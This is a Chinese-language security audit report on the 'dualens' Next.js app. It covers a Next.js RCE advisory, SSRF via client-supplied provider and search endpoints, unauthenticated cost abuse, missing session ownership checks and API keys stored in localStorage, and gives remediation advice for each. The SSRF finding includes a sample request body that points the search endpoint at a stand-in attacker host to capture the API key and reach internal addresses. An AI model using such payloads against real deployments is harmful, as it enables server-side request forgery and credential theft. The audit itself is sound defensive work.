# Security Audit

审计时间：2026-04-23
审计范围：当前仓库中的 `dualens` Next.js/TypeScript 应用、API routes、server runtime、前端凭据存储、依赖、部署/配置文件、当前 Git 历史中的敏感信息线索。
限制：本次只做审计并生成报告，未修改业务代码。

## 总览

最高风险入口是 `next@15.3.0` 命中的 Critical 级 React Flight/RSC RCE 公告，其次是公开 API 允许客户端控制服务端 `fetch` 目标 URL，形成 SSRF/内网访问路径。当前未发现 shell 命令执行、服务端文件上传落盘执行、SQL/NoSQL 数据库访问、Nginx/Apache/Docker/systemd 配置文件。

依赖审计命令：

- `pnpm audit --prod`：13 个生产依赖漏洞，包含 1 Critical、4 High。
- `pnpm audit`：14 个总漏洞，额外包含 dev 依赖 `@eslint/plugin-kit` Low。

## 1. Critical - Next.js 15.3.0 命中 React Flight 协议 RCE 漏洞

文件位置：

- `dualens/package.json:14-18`
- `dualens/pnpm-lock.yaml`

证据：

- 当前生产依赖固定 `next: "15.3.0"`。
- `pnpm audit --prod` 报告：`Next.js is vulnerable to RCE in React flight protocol`，影响 `>=15.3.0-canary.0 <15.3.6`，修复版本 `>=15.3.6`，公告 `GHSA-9qr9-h5gf-34mp`。
- 同一个 `next@15.3.0` 还命中多项 High/Moderate DoS、SSRF、source exposure、request smuggling 类公告，最高修复门槛至少到 `>=15.5.15`。

攻击方式：

攻击者直接访问公开 Next.js 服务，构造触发 React Flight / Server Components 漏洞的 HTTP 请求。若公告适用当前运行方式，可在 Node 服务端进程上下文执行代码。

影响范围：

- 服务端进程被接管。
- 读取 `.env.local` 中配置的模型/搜索 API key。
- 访问内网、云元数据、文件系统或继续利用下游凭据。

修复建议：

- 立即升级 `next` 和匹配的 `eslint-config-next` 到当前 Next.js 15 最新补丁版；从本次审计结果看，至少需要覆盖 `>=15.5.15` 这一批公告修复门槛。
- 升级后重新执行 `pnpm audit --prod`，确认 Critical/High 清零。
- 若已公网部署，按 RCE 事件处理：轮换服务端环境变量和供应商 API key，检查运行日志、异常出站连接、构建产物和部署主机持久化点。

## 2. High - 客户端可控制模型 provider `baseUrl`，服务端无白名单发起请求

文件位置：

- `dualens/src/lib/validators.ts:19-23`
- `dualens/src/components/session-shell.tsx:433-445`
- `dualens/src/server/runtime.ts:841-869`
- `dualens/src/server/llm/openai-compatible-provider.ts:63-89`

证据：

- `providerConfigSchema` 只要求 `baseUrl` 是 URL，没有限制域名、协议安全性、私有网段或 DNS 解析结果。
- 前端从 `localStorage` 读取 provider 配置，并把 `providerConfig` 放进 `/api/session` 请求体。
- `runtime.createSession()` 优先使用 `parsed.providerConfig`。
- `createOpenAICompatibleProvider()` 拼接 `${baseUrl}/chat/completions` 后由服务端 `fetch` 发起 POST，并携带 `Authorization: Bearer ${apiKey}`。

攻击方式：

攻击者向 `POST /api/session` 直接提交恶意 `providerConfig.baseUrl`，例如指向内网 HTTP 服务、云元数据地址、管理面板、攻击者控制的域名或 DNS rebinding 域名。服务端会在后续 session runner 中向该地址发起 POST 请求。

影响范围：

- SSRF：从服务端网络位置访问内网服务。
- 内网探测：根据响应状态、超时和错误类别判断目标存在性。
- 凭据外传：攻击者控制的 endpoint 可接收请求体和 `apiKey`。
- 与依赖 RCE 或弱内网服务组合时，可能成为进一步入侵路径。

修复建议：

- 公网部署不要接受任意客户端 `baseUrl`；改为服务端维护 provider allowlist，客户端只传 provider id/model id。
- 若必须支持自定义 provider，服务端应校验：仅允许 `https`，禁止 localhost、loopback、link-local、RFC1918、IPv6 private、metadata IP，DNS 解析后按最终 IP 校验，并禁止或重新校验 redirect。
- 对 provider 请求增加独立 egress 策略、连接超时、响应大小限制和审计日志。

## 3. High - 客户端可控制 Tavily `endpoint`，并可二次驱动页面提取 SSRF

文件位置：

- `dualens/src/lib/validators.ts:24-30`
- `dualens/src/components/session-shell.tsx:433-445`
- `dualens/src/server/runtime.ts:70-84`
- `dualens/src/server/research/tavily-provider.ts:50-67`
- `dualens/src/server/research/duckduckgo-provider.ts:143-155`

证据：

- `searchConfigSchema` 只要求 `endpoint` 是 URL。
- `createResearchProvider()` 在 `engineId === "tavily"` 时直接把 `searchConfig.endpoint` 传给 `createTavilyProvider()`。
- `createTavilyProvider()` 对 `searchUrl` 发起服务端 POST。
- Tavily 返回结果会进入通用 evidence 提取流程，`extract(result.url)` 会继续由服务端请求搜索结果 URL。

攻击方式：

攻击者提交：

```json
{
  "searchConfig": {
    "engineId": "tavily",
    "apiKey": "x",
    "endpoint": "https://attacker.example/search"
  }
}
```

攻击者控制的 endpoint 返回 `results`，其中 `url` 指向 `http://127.0.0.1:...`、内网管理地址或云元数据地址。服务端先 POST 到攻击者 endpoint，再对结果 URL 发起二次 GET。

影响范围：

- 直接 SSRF 到任意 `searchConfig.endpoint`。
- 二次 SSRF 到搜索结果 URL。
- 暴露用户查询、Tavily API key、内网可达性和部分页面内容摘要。

修复建议：

- 搜索引擎 endpoint 改成服务端 allowlist，不接受任意 URL。
- 对所有待提取页面 URL 做 SSRF 防护：协议限制、DNS 解析后 IP 拦截、redirect 后重新校验、私网/metadata 禁止、最大响应体、超时和内容类型限制。
- Tavily 官方 endpoint 固定为服务端配置；客户端只选择 engine id。

## 4. High - 未授权创建 session 可触发无限制后台 LLM/搜索任务，造成资源和费用消耗

文件位置：

- `dualens/src/app/api/session/route.ts:42-46`
- `dualens/src/lib/validators.ts:31-36`
- `dualens/src/server/runtime.ts:222-225`
- `dualens/src/server/runtime.ts:812-838`

证据：

- `POST /api/session` 无鉴权、无速率限制。
- `config.roundCount` 只要求 `positive()`，没有最大值。
- `getRequiredTurnCount()` 在 shared-evidence 模式下使用 `session.config.roundCount * 2`。
- `startSessionRunner()` 创建后台循环，持续调用 `advanceSessionStep()` 直到 session complete。

攻击方式：

攻击者批量请求 `/api/session`，传入极大的 `config.roundCount` 或大量并发 session。每个 session 都会启动后台 runner，持续发起搜索请求和模型请求。

影响范围：

- 消耗模型供应商额度和 Tavily/搜索额度。
- 增加 Node 进程内存、事件循环压力和出站网络流量。
- 与 SSRF 配置组合时，可形成持续内网请求。

修复建议：

- 为 `/api/session` 增加鉴权、IP/user 级速率限制、验证码或配额。
- 对 `roundCount` 设置严格上限，例如 1-5，并在服务端强制。
- 引入任务队列和全局并发限制；失败/超时后停止 runner。
- 对公网部署关闭匿名自动运行，改为显式用户操作或后台队列授权。

## 5. Medium - session API 缺少所有权校验，session id 变成 bearer token

文件位置：

- `dualens/src/app/api/session/[sessionId]/route.ts:4-8`
- `dualens/src/app/api/session/[sessionId]/continue/route.ts:39-44`
- `dualens/src/app/api/session/[sessionId]/premise/route.ts:12-17`
- `dualens/src/app/api/session/[sessionId]/stop/route.ts:4-8`
- `dualens/src/server/session-store.ts:7-19`

证据：

- `GET /api/session/{sessionId}`、`POST /continue`、`POST /premise`、`POST /stop` 都只依赖 URL 中的 `sessionId`。
- session 存在全局 Map 中，没有用户、cookie、owner、tenant 或 ACL 字段。

攻击方式：

攻击者只要获得 session id，就可以读取会话、追加 premise、推进或停止会话。UUID 随机性降低了暴力枚举概率，但不能防止日志、浏览器历史、前端错误报告、代理日志或用户分享导致的泄露。

影响范围：

- 读取辩论问题、证据、摘要、诊断信息和 provider base URL/model。
- 篡改或终止他人 session。
- 触发额外后台请求，造成费用消耗。

修复建议：

- 引入登录态或匿名 session cookie，并在 session 记录中保存 owner id。
- 所有 session API 校验 owner。
- session id 继续保持随机，但只能作为对象 id，不能作为唯一授权凭据。
- 加 TTL 和清理机制，减少泄露窗口。

## 6. Medium - API key 明文存储在浏览器 `localStorage`

文件位置：

- `dualens/src/lib/model-provider-preferences.ts:118-130`
- `dualens/src/lib/model-provider-preferences.ts:175-190`
- `dualens/src/lib/model-provider-preferences.ts:233-245`
- `dualens/src/lib/search-engine-preferences.ts:117-147`
- `dualens/src/lib/search-engine-preferences.ts:173-187`

证据：

- 模型 provider 和搜索引擎配置从 `localStorage` 读取。
- 保存配置时将包含 `apiKey` 的 JSON 直接写入 `localStorage`。
- 运行时配置把 `apiKey` 从浏览器传给服务端。

攻击方式：

一旦出现 XSS、恶意浏览器扩展、共享设备泄露或浏览器调试数据采集，攻击者可以直接读取 provider/search API key。当前未发现明显 `dangerouslySetInnerHTML`，但依赖 RCE、供应链脚本或未来 XSS 都会放大此问题。

影响范围：

- 用户自己的模型/搜索 API key 被盗刷。
- 攻击者可把被盗 key 配合自定义 endpoint/SSRF 继续利用。

修复建议：

- 公网产品应改为服务端密钥托管：客户端只选择 provider id，服务端使用密钥引用。
- 如果必须本地保存，优先用更短生命周期的 `sessionStorage` 或浏览器 Credential Management，并明确风险提示。
- 增加 CSP，减少 XSS 读取 `localStorage` 的概率。

## 7. Low - 未配置基础安全响应头，增加 XSS/点击劫持后的损失面

文件位置：

- `dualens/next.config.ts:1-5`

证据：

- `next.config.ts` 为空，没有 CSP、frame-ancestors、X-Content-Type-Options、Referrer-Policy 等响应头配置。
- 前端存在长期 `localStorage` API key，缺少 CSP 会扩大 XSS 后果。

攻击方式：

如果未来出现 XSS 或第三方脚本污染，攻击者更容易读取 localStorage、调用同源 API 或把页面嵌入恶意站点诱导操作。

影响范围：

- 凭据泄露风险增加。
- session 操作被诱导或自动化。

修复建议：

- 增加严格 CSP，至少限制 `script-src`、`connect-src`、`frame-ancestors 'none'`。
- 增加 `X-Content-Type-Options: nosniff`、`Referrer-Policy`、`Permissions-Policy`。
- 与 provider/search allowlist 配套维护 `connect-src`。

## Secrets 检查结果

文件位置：

- `.gitignore:8-9`
- `dualens/.env.local`
- `dualens/README.md:83-88`

结论：

- 当前工作区存在 `dualens/.env.local`，包含 `DEEPSEEK_API_KEY` 和 `TAVILY_API_KEY`。本报告未记录实际值。
- `.gitignore` 已忽略 `**/.env` 和 `**/.env.*`。
- `git ls-files --stage -- dualens/.env.local` 无输出，说明当前 `.env.local` 未被 Git 跟踪。
- `git log --all -- dualens/.env.local` 无输出，未发现该文件曾进入当前仓库历史。
- 关键词历史扫描只命中文档、测试里的占位值和说明文本，未确认发现真实 key/token 入库。

建议：

- 保持 `.env.local` 不入库。
- 若该工作区曾共享、打包或上传，轮换 `DEEPSEEK_API_KEY` 和 `TAVILY_API_KEY`。
- CI 中加入 secret scanning，避免后续提交真实凭据。

## 未发现的高危类别

- 任意命令执行：未发现 `child_process`、`exec`、`spawn`、`system`、`Runtime.exec` 等服务端命令执行入口。
- 服务端文件上传后执行：未发现服务端上传落盘；当前“上传本地证据”是浏览器内 `File.text()` 读取并进入 React 状态。
- SQL/NoSQL 注入：未发现数据库驱动、SQL 拼接或 NoSQL 查询入口。
- 危险反序列化：未发现 pickle/yaml/unserialize；JSON 解析后多数路径有结构校验。
- Docker/systemd/Nginx/Apache 高风险配置：仓库中未发现相关部署配置文件。

## 优先级修复路线

1. 立即升级 `next` 并重新执行 `pnpm audit --prod`。
2. 封堵 SSRF：provider/search endpoint 只允许服务端 allowlist，所有服务端出站 URL 做私网/IP/redirect 校验。
3. 给 `/api/session` 和 `sessionId` API 加鉴权、owner 校验、速率限制和 `roundCount` 上限。
4. 调整 API key 存储策略，避免长期明文保存在 `localStorage`。
5. 增加安全响应头和 secret scanning。
